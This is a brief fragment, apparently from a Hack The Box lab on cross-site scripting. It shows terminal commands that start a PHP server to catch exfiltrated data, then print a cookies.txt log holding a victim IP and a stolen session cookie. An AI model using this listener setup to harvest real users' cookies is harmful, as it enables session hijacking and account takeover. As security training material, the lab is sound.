...
EssMack90@htb[/htb]`$ mkdir /tmp/tmpserver $ cd /tmp/tmpserver $ sudo php -S 0.0.0.0:80 PHP 7.4.15 Development Server (http://0.0.0.0:80) started`
...
EssMack90@htb[/htb]`$ cat cookies.txt  Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2`
